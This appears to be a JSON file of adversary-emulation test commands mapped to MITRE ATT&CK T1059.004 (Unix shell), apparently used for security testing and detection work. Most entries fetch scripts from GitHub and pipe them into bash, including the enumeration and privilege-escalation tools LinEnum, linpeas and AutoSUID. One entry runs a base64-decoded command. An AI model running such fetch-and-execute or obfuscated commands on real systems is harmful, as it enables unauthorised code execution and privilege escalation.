{
  "commands": [
    {
      "tactic_id": "T1059.004",
      "technique": "Command and Scripting Interpreter - Unix Shell",
      "command": "wget -q -O- https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash"
    },
    {
      "tactic_id": "T1059.004-1",
      "technique": "Command and Scripting Interpreter - Unix Shell",
      "command": "wget -q https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh -O /tmp/AutoSUID.sh \nbash /tmp/AutoSUID.sh"
    },
    {
      "tactic_id": "T1059.004-2",
      "technique": "Command and Scripting Interpreter - Unix Shell",
      "command": "curl -sS https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh | bash"
    },
    {
      "tactic_id": "T1059.004-3",
      "technique": "Command and Scripting Interpreter - Unix Shell",
      "command": "printenv SHELL"
    },
    {
      "tactic_id": "T1059.004-4",
      "technique": "Command and Scripting Interpreter - Unix Shell",
      "command": "cat /etc/shells"
    },
    {
      "tactic_id": "T1059.004-5",
      "technique": "Command and Scripting Interpreter - Unix Shell",
      "command": "curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash"
    },
    {
      "tactic_id": "T1059.004-6",
      "technique": "Command and Scripting Interpreter - Unix Shell",
      "command": "curl -L -o /tmp/linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh && bash /tmp/linpeas.sh"
    },
     {
      "tactic_id": "T1059.004-7",
      "technique": "Base64 Encode/Decode with Execution",
      "command": "encodecmd=\"base64 -w 0\" && decodecmd=\"base64 -d\"\nBAS=$(echo -n \"id\" | $encodecmd)\necho \"\\$BAS=$BAS\"\necho -n \"$BAS\" | $decodecmd | /bin/bash\nunset BAS"
    }
  ]
}
